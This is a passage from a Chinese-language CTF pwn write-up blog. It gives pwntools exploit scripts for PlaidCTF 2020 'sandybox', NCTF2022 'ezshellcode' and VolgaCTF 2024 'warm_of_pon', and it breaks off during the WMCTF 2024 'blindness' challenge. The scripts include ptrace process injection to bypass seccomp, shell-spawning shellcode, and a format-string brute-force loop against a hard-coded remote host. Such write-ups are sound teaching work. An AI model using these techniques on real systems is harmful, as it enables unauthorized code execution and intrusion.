class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./sandybox&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 1000</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"><span class="comment"># Invoke int3 to invert the main tracer loop</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov rax, 8</span></span><br><span class="line"><span class="string">int3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># And now just read the flag file :)</span></span><br><span class="line">shellcode += asm(shellcraft.amd64.cat(<span class="string">&#x27;flag&#x27;</span>), arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://ctftime.org/writeup/20115">CTFtime.org / PlaidCTF 2020 / sandybox / Writeup</a></p><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><p><a href="https://www.anquanke.com/post/id/231078">Linux沙箱入门——ptrace从0到1-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>在Linux系统中，进程状态除了我们所熟知的<code>TASK_RUNNING</code>，<code>TASK_INTERRUPTIBLE</code>，<code>TASK_STOPPED</code>等，还有一个<code>TASK_TRACED</code>，而<code>TASK_TRACED</code>将调试程序断点成为可能。</p><ol><li><strong>R (TASK_RUNNING)，可执行状态。</strong></li><li><strong>S (TASK_INTERRUPTIBLE)，可中断的睡眠状态。</strong></li><li><strong>D (TASK_UNINTERRUPTIBLE)，不可中断的睡眠状态。</strong></li><li><strong>T (TASK_STOPPED or TASK_TRACED)，暂停状态或跟踪状态。</strong></li></ol><p>当使用了ptrace跟踪后，<strong>所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程</strong>，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED，而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span>       </span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid, <span class="type">void</span> *addr, <span class="type">void</span> *data)</span></span>;</span><br></pre></td></tr></table></figure><p>一共有四个参数：</p><ul><li><code>request</code>: 表示要执行的操作类型。反调试会用到<code>PT_DENY_ATTACH</code>，调试会用到<code>PTRACE_ATTACH</code></li><li><code>pid</code>: 要操作的目标进程ID</li><li><code>addr</code>: 要监控的目标内存地址</li><li><code>data</code>: 保存读取出或者要写入的数据</li></ul><p>request常见的可能取值有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PTRACE_TRACEME = <span class="number">0</span>,        <span class="comment">//被调试进程调用</span></span><br><span class="line">    PTRACE_PEEKTEXT = <span class="number">1</span>， <span class="comment">//从内存addr处读取一个字节</span></span><br><span class="line">    PTRACE_PEEKDATA = <span class="number">2</span>,    <span class="comment">//查看内存addr处的一个字节</span></span><br><span class="line">    PTRACE_PEEKUSER = <span class="number">3</span>,    <span class="comment">//查看struct user 结构体的值</span></span><br><span class="line">    PTRACE_POKETEXT = <span class="number">4</span>， <span class="comment">//查看内存addr处一个字大小的内存（4字节）</span></span><br><span class="line">    PTRACE_POKEDATA = <span class="number">5</span>,    <span class="comment">//修改内存addr处一个字大小的内存（4字节）</span></span><br><span class="line">    PTRACE_POKEUSER = <span class="number">6</span>,    <span class="comment">//修改struct user结构体的值</span></span><br><span class="line">    PTRACE_CONT = <span class="number">7</span>,        <span class="comment">//被调试进程pid继续</span></span><br><span class="line">    PTRACE_SINGLESTEP = <span class="number">9</span>,    <span class="comment">//被调试进程pid执行一条汇编指令</span></span><br><span class="line">    PTRACE_GETREGS = <span class="number">12</span>,    <span class="comment">//获取寄存器(struct user_regs_struct)到内存data中</span></span><br><span class="line">    PTRACE_SETREGS = <span class="number">13</span>,    <span class="comment">//设置内存data上的数据为寄存器(struct user_regs_struct)</span></span><br><span class="line">    PTRACE_ATTACH = <span class="number">16</span>,        <span class="comment">//附加进程pid</span></span><br><span class="line">    PTRACE_DETACH = <span class="number">17</span>,        <span class="comment">//解除附加进程pid</span></span><br><span class="line">    PTRACE_SYSCALL = <span class="number">24</span>,    <span class="comment">//让被调试进程pid在下一次系统调用入口或出口停止</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">ptrace</span> <span class="params">(<span class="keyword">enum</span> __ptrace_request __request, ...)</span></span><br></pre></td></tr></table></figure><p><code>PTRACE_TRACEME</code>标志tracee表明自己想要被追踪，这会<u>自动与父进程建立</u>追踪关系，这也是唯一能被tracee使用的request，其他的request都由tracer指定。</p><p>寄存器相关结构定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r15;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r14;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r13;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r12;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>bp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>bx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r11;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r10;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r9;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r8;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>ax;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>cx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>dx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>si;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>di;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>orig_ax;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>ip;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>cs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>sp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>ss;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>fs_base;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>gs_base;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>ds;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>es;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>fs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>gs;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有配套的偏移值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">##/arch/x86/include/uapi/<span class="keyword">asm</span>/ptrace-abi.h</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R15 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R14 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R13 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R12 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RBP 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RBX 40</span></span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R11 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R10 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R9 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R8 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RAX 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RCX 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RDX 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RSI 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RDI 112</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORIG_RAX 120</span></span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RIP 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CS 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFLAGS 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RSP 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SS 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __ASSEMBLY__ */</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FRAME_SIZE 168</span></span><br></pre></td></tr></table></figure><p>更多相关request可以看man手册或者内核源码</p><p>此外现在ptrace多了一些安全机制,即/proc/sys/kernel/yama/ptrace_scope</p><p>当该值被设置为1时，只能允许非特权用户ptrace跟踪自己的子进程</p><p>即使是属于自己的进程，如果不是子进程，仍然没有权限去attach，借此来实现一定程度上的避免ptrace进程注入</p><h1 id="NCTF2022-ezshellcode"><a href="#NCTF2022-ezshellcode" class="headerlink" title="NCTF2022-ezshellcode"></a>NCTF2022-ezshellcode</h1><p>题目很短</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v3 = getpid();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pid: %d\n&quot;</span>, v3);</span><br><span class="line">  buf = mmap((<span class="type">void</span> *)<span class="number">0x401000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v5 = seccomp_init(<span class="number">2147418112LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">41LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">49LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">42LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">50LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v5);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行任意代码执行,但是关闭了0,1,2三个标准流</p><p>在ezthree这题中我们是通过socket通信来实现获取flag</p><p>但这题很贴心的去除了socket相关系统调用</p><p>不过却给了我们进程的pid,并且可以发现在Dockerfile中有这么一句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure><p>关闭了ptrace特权保护</p><p>那么接下来的思路就很明确了,我们打开两个ezshellcode进程</p><p>其中A进程在得到其pid后阻塞在那,暂时不管</p><p>B进程则利用A的pid去ptrace注入A进程,并在读取完shellcode后,利用ptrace使得A进程直接跳转到shellcode处执行,跳过关闭0,1,2</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span>: gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pid: &#x27;</span>)</span><br><span class="line">pid=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;pid-&gt;&#x27;</span>+<span class="built_in">hex</span>(pid))</span><br><span class="line"> </span><br><span class="line">shellcode=shellcraft.ptrace(<span class="number">0x10</span>,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.ptrace(<span class="number">0x18</span>,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.wait4(pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.ptrace(<span class="number">12</span>,pid,<span class="number">0</span>,<span class="number">0x401500</span>)</span><br><span class="line">shellcode+=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   mov r9,0x401000</span></span><br><span class="line"><span class="string">   mov r8,0x401500</span></span><br><span class="line"><span class="string">   mov r11,qword ptr [r8+0x78]</span></span><br><span class="line"><span class="string">   mov r12,0</span></span><br><span class="line"><span class="string">   cmp r11,r12</span></span><br><span class="line"><span class="string">   je return</span></span><br><span class="line"><span class="string">   mov qword ptr [r8+0x80],r9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="comment">#如果是read调用则允许,并去到下一次syscall循环</span></span><br><span class="line">shellcode+=shellcraft.ptrace(<span class="number">13</span>,pid,<span class="number">0x401500</span>)+shellcraft.ptrace(<span class="number">17</span>,pid,<span class="number">0</span>,<span class="number">0</span>)+<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">return:</span></span><br><span class="line"><span class="string">    mov r13,0x401013</span></span><br><span class="line"><span class="string">    jmp r13</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sl(asm(shellcode))</span><br><span class="line">p.interactive()</span><br><span class="line"> </span><br><span class="line">r.sendline(asm(shellcraft.sh()))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="volgactf2024-warm-of-pon"><a href="#volgactf2024-warm-of-pon" class="headerlink" title="volgactf2024-warm_of_pon"></a>volgactf2024-warm_of_pon</h1><p>题目东西不多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+30h] [rbp+0h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  *(&amp;savedregs - <span class="number">305</span>) = (<span class="type">unsigned</span> __int64)<span class="built_in">malloc</span>(<span class="number">8uLL</span>) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;</span><br><span class="line">  *(_QWORD *)*(&amp;savedregs - <span class="number">305</span>) = retaddr;</span><br><span class="line">  gets(format);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">0x20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)((i &lt;&lt; <span class="number">12</span>) + *(&amp;savedregs - <span class="number">305</span>)) )</span><br><span class="line">      retaddr = *(<span class="type">void</span> **)((i &lt;&lt; <span class="number">12</span>) + *(&amp;savedregs - <span class="number">305</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始将retaddr保存到堆中,然后有一个栈溢出一个格式化字符串漏洞</p><p>直接修改栈上的返回地址是没有用的,因为格式化字符串漏洞之后会从堆上恢复之前保存的地址</p><p>一开始的思路是劫持.fini.array</p><p>但发现其没有写权限,后来一度没有思路</p><p>直到发现最后那个循环很奇怪,最后越看越觉得是爆破</p><p>那个循环就是为了加大爆破成功的概率,因为他会检查整个堆,并且以后找到的为返回地址,这极大提高了成功的概率(大概提了二十倍)</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;172.105.246.203&#x27;</span>, <span class="number">1339</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;%4555c%11$ln%117c%12$hhn&#x27;</span> + p64(<span class="number">0x568000</span>) + p64(<span class="number">0x568000</span> + <span class="number">2</span>)</span><br><span class="line">    <span class="comment">#0x568000是随便选的,只要在堆范围内就行</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">    output = sh.recvall()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;CTF&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure><h1 id="wm2024-blindness"><a href="#wm2024-blindness" class="headerlink" title="wm2024-blindness"></a>wm2024-blindness</h1><p>允许我们申请一个任意大小的chunk</p><p>之后再解释256字节的brainfuck</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sizea; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *size_4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Pls input the data size\n&quot;</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  sizea = readInt();</span><br><span class="line">  data = (__int64)<span class="built_in">malloc</span>(sizea);</span><br><span class="line">  <span class="keyword">if</span> ( !data )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Pls input the code size\n&quot;</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  size = readInt();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  size_4 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !size_4 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;error\n&quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(<span class="string">&quot;Pls input your code\n&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Pls input your code\n&quot;</span>, v4);</span><br><span class="line">  read(<span class="number">0</span>, size_4, size);</span><br><span class="line">  executeBrainfuck(size_4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其允许我们在申请出的堆块附近任意读写,但是只能向上读写</p><p>这要如何利用?</p><p>我们知道在malloc申请时,如果现有堆无法满足分配大小,会有两种情况,一种是抬高brk拓展现有堆,还有一种是直接使用mmap分配</p><p>当申请大小较大时会是第二种情况</p><p>且可以观察到,这种情况下,这个申请出来的堆块是于libc区域相邻的,也就是出题人给的hint</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 